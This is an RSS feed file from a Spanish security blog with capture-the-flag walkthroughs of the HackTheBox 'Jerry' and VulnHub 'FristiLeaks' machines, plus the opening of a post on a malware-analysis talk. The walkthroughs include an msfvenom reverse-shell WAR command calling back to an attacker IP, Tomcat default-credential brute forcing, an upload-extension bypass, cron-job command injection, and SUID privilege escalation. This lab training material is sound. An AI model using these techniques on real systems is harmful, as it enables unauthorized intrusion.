@@ -1,0 +1,2501 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Roskyfrosky Blog</title>
+    <description>This is my personal blog</description>
+    <link>https://blog.roskyfrosky.com/</link>
+    <atom:link href="https://blog.roskyfrosky.com/sitemap.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Wed, 21 Nov 2018 20:56:57 +0000</pubDate>
+    <lastBuildDate>Wed, 21 Nov 2018 20:56:57 +0000</lastBuildDate>
+    <generator>Jekyll v3.8.4</generator>
+    
+      <item>
+        <title>Jerry - Hack The Box</title>
+        <description>&lt;p&gt;&lt;img src=&quot;/images/Hackthebox/Jerry/logo.png&quot; alt=&quot;Nmap&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hoy os traigo el writeup de como resolver la máquina Jerry de Hackthebox. Como podéis ver la dificultad de la máquina es fácil.&lt;/p&gt;
+
+&lt;h2 id=&quot;-00--recon&quot;&gt;[ 00 – Recon]&lt;/h2&gt;
+&lt;p&gt;En primer lugar realizamos un escaneo de puertos para comprobar que servicios están corriendo en la máquina.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Hackthebox/Jerry/nmap.png&quot; alt=&quot;Nmap&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que se está ejecutando un apache tomcat en el puerto 8080.&lt;/p&gt;
+
+&lt;h2 id=&quot;-01--getting-access&quot;&gt;[ 01 – Getting Access]&lt;/h2&gt;
+
+&lt;p&gt;Para poder acceder a la consola de gestión del tomcat, necesitamos un usuario y una contraseña. Para ello vamos a hacer fuerza bruta con el módulo de metasploit que contiene las contraseñas más típicas y por defecto usadas en tomcat:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;use auxiliary/scanner/http/tomcat_mgr_login&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Hackthebox/Jerry/users.png&quot; alt=&quot;Nmap&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tenemos suerte y vemos que encontramos las credenciales tomcat:s3cret.
+Una vez dentro de la consola de administración comprobamos que SO está ejecutando y la arquitectura del mismo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Hackthebox/Jerry/server_information.png&quot; alt=&quot;Nmap&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Se trata de un windows Server 2012 de 64 bits. Vamos a subir una shell mediante un fichero war.
+Para ello generamos la shell mediante el siguiente comando, utilizando msfvenom:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -p windows/x64/shell/reverse_tcp LPORT=4444 LHOST=10.10.15.77 -f war &amp;gt; final.war&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora vamos al gestor de aplicaciones y subimos nuestro fichero final.war. Tendremos que desempaquetar el fichero en local, para comprobar el nombre que se ha generado para el fichero jsp de la shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Hackthebox/Jerry/war_name.png&quot; alt=&quot;Nmap&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ponemos a escuchar un netcat en el puerto que hemos definido en el comando, en este caso el puerto 4444, y visitamos el fichero a través del navegador para que se realice la conexión, y así obtener Shell:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Hackthebox/Jerry/reverse_shell.png&quot; alt=&quot;Nmap&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;-02--priv-esc&quot;&gt;[ 02 – Priv. Esc.]&lt;/h2&gt;
+&lt;p&gt;En este caso no hace falta escalar privilegios porque la reverse shell que  hemos obtenido es de usuario adminsitrador&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Hackthebox/Jerry/whoami.png&quot; alt=&quot;Nmap&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y podríamos leer las flags tanto de user como de root.&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 20 Nov 2018 11:11:34 +0000</pubDate>
+        <link>https://blog.roskyfrosky.com/hackthebox/2018/11/20/Jerry-hackthebox.html</link>
+        <guid isPermaLink="true">https://blog.roskyfrosky.com/hackthebox/2018/11/20/Jerry-hackthebox.html</guid>
+        
+        <category>hackthebox</category>
+        
+        
+        <category>hackthebox</category>
+        
+      </item>
+    
+      <item>
+        <title>Vulnhub FristiLeak</title>
+        <description>&lt;h1 id=&quot;fristileak&quot;&gt;FristiLeak&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;URL de la máquina:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/fristileaks-13,133/&quot;&gt;https://www.vulnhub.com/entry/fristileaks-13,133/&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;Descripción:&lt;/strong&gt; A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..&lt;/p&gt;
+
+&lt;h2 id=&quot;solución&quot;&gt;Solución&lt;/h2&gt;
+
+&lt;p&gt;Lo primero que realizamos, como en todas las máquinas, es realizar un escaneo de puertos para ver que servicios están corriendo en la máquina.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/fristileak/nmap.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que se encuentra corriendo en el puerto 80 un servidor apache. Al acceder a través del navegador vemos la siguiente imagen&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/fristileak/inicial.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Miramos el código fuente y posible ficheros típicos como pueden ser sitemap.xml, robots.txt, etc.&lt;/p&gt;
+
+&lt;p&gt;Vemos que en el fichero robots.txt aparece el siguiente contenido&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;User-agent: *
+Disallow: /cola
+Disallow: /sisi
+Disallow: /beer
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Pero cuando accedemos a las distintas carpetas siempre vemos la siguiente imagen&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/fristileak/not_url.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Trás analizar la imagen vemos que no esconde nada, por lo que decidimos lanzar un dirbuster para ver si hubiese algún fichero en el servidor que no estuviera referenciado en el robots.txt. Con el dirbuster y los diccionarios comunes no encontramos nada, por lo que seguimos pensando hasta que empezamos a probar distintos ficheros y carpetas que estén relacionados con las palabras que se encuentran en la página inicial.&lt;/p&gt;
+
+&lt;p&gt;Trás un rato probando entradas como fristileak, FristiLeak.txt, leak.txt, Leak.txt… encontramos que existe la carpeta fristi. Al acceder, podemos observar la siguiente pantalla.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/fristileak/login.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;mirando en el código fuente de la página, encontramos dos compentarios, En el primero nos indica un usuario.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/fristileak/usuario.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;y en el segundo que se trata de un base64.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/fristileak/imagen_oculta.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Al decodear el base64 nos damos cuenta de que se trata de una imagen, que es la siguiente:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/fristileak/imagen_oculta_visual.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Probamos el usuario que hemos encontrado en el comentario y como contraseña el texto de la imagen. Parece ser que la combinación funciona :D.
+Al entrar vemos un upload, con la que vamos a intentar subir una shell.&lt;br /&gt;
+&lt;img src=&quot;/images/Vulnhub/fristileak/upload1.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Al intentar subir un fichero, nos indican que solo se pueden subir ficheros con extension .jpg, .png y .gif.&lt;br /&gt;
+Probamos a subir nuestra reverse shell añadiendo la extensión .jpg al final, dado que es un fallo muy conocido.
+Puedes encontrar más información de como funciona la doble extensión &lt;a href=&quot;http://httpd.apache.org/docs/2.2/mod/mod_mime.html#multipleext&quot;&gt;aquí&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/fristileak/burp.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Al realizar la petición que se muestra en la captura anterior, ponemos a la escucha un netcat en nuestra máquina local para recibir la conexión de la reverse shell y accedemos al fichero que acabamos de subir.&lt;br /&gt;
+Ya tenemos shell en el servidor con el usuario apache, asique vamos hacer que la shell sea tty.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora toca buscar como elevar privilegios para poder leer el fichero de flag solo accesible por root. 
+Dando una vuelta por el servidor, nos encontramos con un fichero (checklogin.php) donde podemos observar unas credenciales de acceso a base de datos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/fristileak/credenciales_database.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Accedemos a la base de datos y comprobamos que información contienen e incluso el usuario bajo el que corre mysql, pero parece ser que este no es el camino.&lt;br /&gt;
+Realizamos otras tareas como enumeración de ficheros con el bit suid activo, sudo -l , etc…pero nada.&lt;/p&gt;
+
+&lt;p&gt;Vamos al directorio /var/www y encontramos los siguientes archivos:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drwxr-xr-x.  6 root root 4096 Nov 17  2015 .
+drwxr-xr-x. 19 root root 4096 Nov 19  2015 ..
+drwxr-xr-x.  2 root root 4096 Aug 24  2015 cgi-bin
+drwxr-xr-x.  3 root root 4096 Nov 17  2015 error
+drwxr-xr-x.  7 root root 4096 Nov 25  2015 html
+drwxr-xr-x.  3 root root 4096 Nov 17  2015 icons
+-rw-r--r--   1 root root   98 Nov 17  2015 notes.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;y miramos a ver que contiene el fichero notes.txt&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hey eezeepz your homedir is a mess, go clean it up, just dont delete
+the important stuff.
+
+-jerry
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Por lo que vamos al directorio /home para ver si encontramos algo interesante. Vemos que existen tres usuarios en la máquina&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/fristileak/users_home.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dado que tenemos permisos de usuario apache, el unico directorio al que podemos acceder de momento es eezeepz, entramos para ver que podemos encontrar tal y como nos ha indicado el mensaje anterior.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;total 2608  
+drwx---r-x. 5 eezeepz eezeepz  12288 Nov 18  2015 .  
+drwxr-xr-x. 5 root    root      4096 Nov 19  2015 ..  
+drwxrwxr-x. 2 eezeepz eezeepz   4096 Nov 17  2015 .Old  
+-rw-r--r--. 1 eezeepz eezeepz     18 Sep 22  2015 .bash_logout  
+-rw-r--r--. 1 eezeepz eezeepz    176 Sep 22  2015 .bash_profile
+-rw-r--r--. 1 eezeepz eezeepz    124 Sep 22  2015 .bashrc
+drwxrwxr-x. 2 eezeepz eezeepz   4096 Nov 17  2015 .gnome
+drwxrwxr-x. 2 eezeepz eezeepz   4096 Nov 17  2015 .settings
+-rwxr-xr-x. 1 eezeepz eezeepz  24376 Nov 17  2015 MAKEDEV
+-rwxr-xr-x. 1 eezeepz eezeepz  33559 Nov 17  2015 cbq
+-rwxr-xr-x. 1 eezeepz eezeepz   6976 Nov 17  2015 cciss_id
+-rwxr-xr-x. 1 eezeepz eezeepz  56720 Nov 17  2015 cfdisk
+-rwxr-xr-x. 1 eezeepz eezeepz  25072 Nov 17  2015 chcpu
+-rwxr-xr-x. 1 eezeepz eezeepz  52936 Nov 17  2015 chgrp
+-rwxr-xr-x. 1 eezeepz eezeepz  31800 Nov 17  2015 chkconfig
+-rwxr-xr-x. 1 eezeepz eezeepz  48712 Nov 17  2015 chmod
+-rwxr-xr-x. 1 eezeepz eezeepz  53640 Nov 17  2015 chown
+-rwxr-xr-x. 1 eezeepz eezeepz  44528 Nov 17  2015 clock
+-rwxr-xr-x. 1 eezeepz eezeepz   4808 Nov 17  2015 consoletype
+-rwxr-xr-x. 1 eezeepz eezeepz 129992 Nov 17  2015 cpio
+-rwxr-xr-x. 1 eezeepz eezeepz  38608 Nov 17  2015 cryptsetup
+-rwxr-xr-x. 1 eezeepz eezeepz   5344 Nov 17  2015 ctrlaltdel
+-rwxr-xr-x. 1 eezeepz eezeepz  41704 Nov 17  2015 cut
+-rwxr-xr-x. 1 eezeepz eezeepz  14832 Nov 17  2015 halt
+-rwxr-xr-x. 1 eezeepz eezeepz  13712 Nov 17  2015 hostname
+-rwxr-xr-x. 1 eezeepz eezeepz  44528 Nov 17  2015 hwclock
+-rwxr-xr-x. 1 eezeepz eezeepz   7920 Nov 17  2015 kbd_mode
+-rwxr-xr-x. 1 eezeepz eezeepz  11576 Nov 17  2015 kill
+-rwxr-xr-x. 1 eezeepz eezeepz  16472 Nov 17  2015 killall5
+-rwxr-xr-x. 1 eezeepz eezeepz  32928 Nov 17  2015 kpartx
+-rwxr-xr-x. 1 eezeepz eezeepz  11464 Nov 17  2015 nameif
+-rwxr-xr-x. 1 eezeepz eezeepz 171784 Nov 17  2015 nano
+-rwxr-xr-x. 1 eezeepz eezeepz   5512 Nov 17  2015 netreport
+-rwxr-xr-x. 1 eezeepz eezeepz 123360 Nov 17  2015 netstat
+-rwxr-xr-x. 1 eezeepz eezeepz  13892 Nov 17  2015 new-kernel-pkg
+-rwxr-xr-x. 1 eezeepz eezeepz  25208 Nov 17  2015 nice
+-rwxr-xr-x. 1 eezeepz eezeepz  13712 Nov 17  2015 nisdomainname
+-rwxr-xr-x. 1 eezeepz eezeepz   4736 Nov 17  2015 nologin
+-r--r--r--. 1 eezeepz eezeepz    514 Nov 18  2015 notes.txt
+-rwxr-xr-x. 1 eezeepz eezeepz 390616 Nov 17  2015 tar
+-rwxr-xr-x. 1 eezeepz eezeepz  11352 Nov 17  2015 taskset
+-rwxr-xr-x. 1 eezeepz eezeepz 249000 Nov 17  2015 tc
+-rwxr-xr-x. 1 eezeepz eezeepz  51536 Nov 17  2015 telinit
+-rwxr-xr-x. 1 eezeepz eezeepz  47928 Nov 17  2015 touch
+-rwxr-xr-x. 1 eezeepz eezeepz  11440 Nov 17  2015 tracepath
+-rwxr-xr-x. 1 eezeepz eezeepz  12304 Nov 17  2015 tracepath6
+-rwxr-xr-x. 1 eezeepz eezeepz  21112 Nov 17  2015 true
+-rwxr-xr-x. 1 eezeepz eezeepz  35608 Nov 17  2015 tune2fs
+-rwxr-xr-x. 1 eezeepz eezeepz  15410 Nov 17  2015 weak-modules
+-rwxr-xr-x. 1 eezeepz eezeepz  12216 Nov 17  2015 wipefs
+-rwxr-xr-x. 1 eezeepz eezeepz 504400 Nov 17  2015 xfs_repair
+-rwxr-xr-x. 1 eezeepz eezeepz  13712 Nov 17  2015 ypdomainname
+-rwxr-xr-x. 1 eezeepz eezeepz     62 Nov 17  2015 zcat
+-rwxr-xr-x. 1 eezeepz eezeepz  47520 Nov 17  2015 zic
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Vemos que existe un fichero notes.txt que parece interesante, vamos a ver que contiene el fichero:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Yo EZ,
+
+I made it possible for you to do some automated checks, 
+but I did only allow you access to /usr/bin/* system binaries. I did
+however copy a few extra often needed commands to my 
+homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
+from /home/admin/
+
+Don't forget to specify the full path for each binary!
+
+Just put a file called &quot;runthis&quot; in /tmp/, each line one command. The 
+output goes to the file &quot;cronresult&quot; in /tmp/. It should 
+run every minute with my account privileges.
+
+- Jerry
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vaya nos indica que de alguna manera tenemos que lograr acceso al directorio /home/admim. Para ello tenemos que crear un script con nombre “runthis” en la carpeta /tmp y cuyo resultado sera volcado en otro fichero cronresult. Para ello vamos y trás varios intentos vemos que conseguimos cambiar los permisos del directorio /home/admin con el siguiente comando&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;echo '/usr/bin/../../bin/chmod -R 777 /home/admin' &amp;gt; /tmp/runthis&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ls -la /home
+total 28
+drwxr-xr-x.  5 root      root       4096 Nov 19  2015 .
+dr-xr-xr-x. 22 root      root       4096 Mar 14 14:14 ..
+drwxrwxrwx.  2 admin     admin      4096 Nov 19  2015 admin
+drwx---r-x.  5 eezeepz   eezeepz   12288 Nov 18  2015 eezeepz
+drwx------   2 fristigod fristigod  4096 Nov 19  2015 fristigod
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;y dentro del directorio admin encontramos los siguientes ficheros:&lt;/p&gt;
+
+&lt;pre&gt;
+ls -la
+total 652
+drwxrwxrwx. 2 admin     admin       4096 Nov 19  2015 .
+drwxr-xr-x. 5 root      root        4096 Nov 19  2015 ..
+-rwxrwxrwx. 1 admin     admin         18 Sep 22  2015 .bash_logout
+-rwxrwxrwx. 1 admin     admin        176 Sep 22  2015 .bash_profile
+-rwxrwxrwx. 1 admin     admin        124 Sep 22  2015 .bashrc
+-rwxrwxrwx  1 admin     admin      45224 Nov 18  2015 cat
+-rwxrwxrwx  1 admin     admin      48712 Nov 18  2015 chmod
+-rwxrwxrwx  1 admin     admin        737 Nov 18  2015 cronjob.py
+-rwxrwxrwx  1 admin     admin         21 Nov 18  2015 cryptedpass.txt
+-rwxrwxrwx  1 admin     admin        258 Nov 18  2015 cryptpass.py
+-rwxrwxrwx  1 admin     admin      90544 Nov 18  2015 df
+-rwxrwxrwx  1 admin     admin      24136 Nov 18  2015 echo
+-rwxrwxrwx  1 admin     admin     163600 Nov 18  2015 egrep
+-rwxrwxrwx  1 admin     admin     163600 Nov 18  2015 grep
+-rwxrwxrwx  1 admin     admin      85304 Nov 18  2015 ps
+-rw-r--r--  1 fristigod fristigod     25 Nov 19  2015 whoisyourgodnow.txt
+&lt;/pre&gt;
+
+&lt;p&gt;En primer lugar vemos que hay en el fichero whoisyourgodnow.txt.&lt;/p&gt;
+
+&lt;p&gt;=RFn0AKnlMHMPIzpyuTI0ITG&lt;/p&gt;
+
+&lt;p&gt;Parece ser un base64 pero al reves, por lo que damos la vuelta y obtenemos GTI0ITuypzIPMHMlnKA0nFR=.&lt;/p&gt;
+
+&lt;p&gt;Al intentar decodear el base64 nos devuelve algo ilegible, por lo que pensamos que puede haber algún tipo de rot aplicado sobre la cadena de texto. Vemos que se trata de un rot13.&lt;/p&gt;
+
+&lt;p&gt;El resultado de aplicarle el rot13  es TGV0VGhlcmVCZUZyaXN0aSE= y luego decodear el base64 es : LetThereBeFristi!&lt;/p&gt;
+
+&lt;p&gt;Existe también otro fichero con nombre “cryptedpass.txt” que ha sido creado con el fichero cryptpass.py que se muestra a continuación:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat cryptpass.py
+#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
+import base64,codecs,sys
+
+def encodeString(str):
+    base64string= base64.b64encode(str)
+    return codecs.encode(base64string[::-1], 'rot13')
+
+cryptoResult=encodeString(sys.argv[1])
+print cryptoResult
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Este último fichero no contienen una cadena en claro por lo que lo omitimos.&lt;/p&gt;
+
+&lt;p&gt;Parece ser que la cadena obtenida del fichero “whoisyourgodnow.txt” es la contraseña del usuario fristigod. Por ello vamos a cambiar de usuario con el siguiente comando:&lt;/p&gt;
+
+&lt;p class=&quot;code&quot;&gt;su fristigod
+Password:LetThereBeFristi!&lt;/p&gt;
+
+&lt;p&gt;y ya somos usuario fristigod.Entramos en el home del usuario fristigod y  no encontramos nada interensate.&lt;/p&gt;
+
+&lt;p&gt;Dando una vuelta por el sistema encontramos la siguiente ruta /var/fristigod/ donde están los siguientes archivos.&lt;/p&gt;
+
+&lt;p&gt;drwxr-x—   3 fristigod fristigod 4096 Nov 25  2015 .
+drwxr-xr-x. 19 root      root      4096 Nov 19  2015 ..
+-rw——-   1 fristigod fristigod  864 Nov 25  2015 .bash_history
+drwxrwxr-x.  2 fristigod fristigod 4096 Nov 25  2015 .secret_admin_stuff&lt;/p&gt;
+
+&lt;p&gt;Mostramos el fichero .bash_history y nos muestra las acciones que se han realizado:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ls
+pwd
+ls -lah
+cd .secret_admin_stuff/
+ls
+./doCom 
+./doCom test
+sudo ls
+exit
+cd .secret_admin_stuff/
+ls
+./doCom 
+sudo -u fristi ./doCom ls /
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
+exit
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+exit
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+exit
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+sudo /var/fristigod/.secret_admin_stuff/doCom
+exit
+sudo /var/fristigod/.secret_admin_stuff/doCom
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+exit
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+exit
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+groups
+ls -lah
+usermod -G fristigod fristi
+exit
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+less /var/log/secure e
+Fexit
+exit
+exit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que dentro de la carpeta .secret_admin_stuff hay un fichero doCom que ha de ejecutarse con el usuario fristi.&lt;/p&gt;
+
+&lt;p&gt;El fichero tiene el bit SUID y GUID activo.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drwxrwxr-x. 2 fristigod fristigod 4096 Nov 25  2015 .
+drwxr-x---  3 fristigod fristigod 4096 Nov 25  2015 ..
+-rwsr-sr-x  1 root      root      7529 Nov 25  2015 doCom
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Al ejecutarlo con el usuario normal,  nos indica que el usuario con el que lo ejecutamos no es válido.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nice try, but wrong user ;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Si lo ejecutamos tal y como nos muestra el bash_history nos muestra el mensaje de Help de como funciona el comando:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Usage: ./program_name terminal_command ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Al tener el bit SUID activo, vamos a lanzar /bin/bash con permisos de root y así elevar privilegios:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;y así conseguimos shell con privilegios de root! :D.&lt;/p&gt;
+
+&lt;p&gt;Ahora vamos al directorio root y mostramos el fichero fristileaks_secrets.txt donde encontramos el siguiente mensaje con la flag:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]
+
+I wonder if you beat it in the maximum 4 hours it's supposed to take!
+
+Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)
+
+
+Flag: Y0u_kn0w_y0u_l0ve_fr1st1
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+</description>
+        <pubDate>Thu, 15 Mar 2018 11:11:34 +0000</pubDate>
+        <link>https://blog.roskyfrosky.com/vulnhub/2018/03/15/Fristileak-vulnhub.html</link>
+        <guid isPermaLink="true">https://blog.roskyfrosky.com/vulnhub/2018/03/15/Fristileak-vulnhub.html</guid>
+        
+        <category>boot2root</category>
+        
+        <category>vulnhub</category>
+        
+        
+        <category>vulnhub</category>
+        
+      </item>
+    
+      <item>
+        <title>RootedCon 2018 - Iniciación al análisis de malware</title>
+        <description>&lt;p&gt;Durante la pasada edición de la rootedcon, tuve la oportunidad de dar una charla, donde explicaba algunos conceptos básicos para iniciarse en el análisis de malware.&lt;br /&gt;
+A continuación, os dejo las slides del taller que impartí, así como las distintas demostraciones que realicé durante el mismo.&lt;/p&gt;
+
+&lt;p&gt;Además, os he dejado al final del post unas referencias donde podeis profundizar sobre algunos de los conceptos que expliqué, así como el enlace a algunas herramientas.&lt;/p&gt;
+
+&lt;iframe src=&quot;https://docs.google.com/presentation/d/e/2PACX-1vQHUBPVkW8auEv7zOK9ApqVHm-IK1DgfiMH9ZsocOdTnB3Oas-gWjaKNv_zr34xWs7zLxioCZAkv5K9/embed?start=false&amp;amp;loop=false&amp;amp;delayms=3000&quot; frameborder=&quot;0&quot; width=&quot;768&quot; height=&quot;467&quot; allowfullscreen=&quot;true&quot; mozallowfullscreen=&quot;true&quot; webkitallowfullscreen=&quot;true&quot;&gt;&lt;/iframe&gt;
+
+&lt;h2 id=&quot;demostraciones-windows&quot;&gt;Demostraciones Windows&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Unpacking UPX con herramienta automática&lt;/strong&gt;&lt;/p&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/HrqNVfEe4FI&quot; frameborder=&quot;0&quot; allow=&quot;autoplay; encrypted-media&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;p&gt;&lt;strong&gt;Unpacking Aspack manualmente con Ollydbg&lt;/strong&gt;&lt;/p&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/WJIBNE0s84Q&quot; frameborder=&quot;0&quot; allow=&quot;autoplay; encrypted-media&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;p&gt;&lt;strong&gt;Análisis Estático de un malware en .NET&lt;/strong&gt;&lt;/p&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/L7PTF5jV-wA&quot; frameborder=&quot;0&quot; allow=&quot;autoplay; encrypted-media&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;p&gt;&lt;strong&gt;Análisis Dinámico de un malware en .NET&lt;/strong&gt;&lt;/p&gt;
+
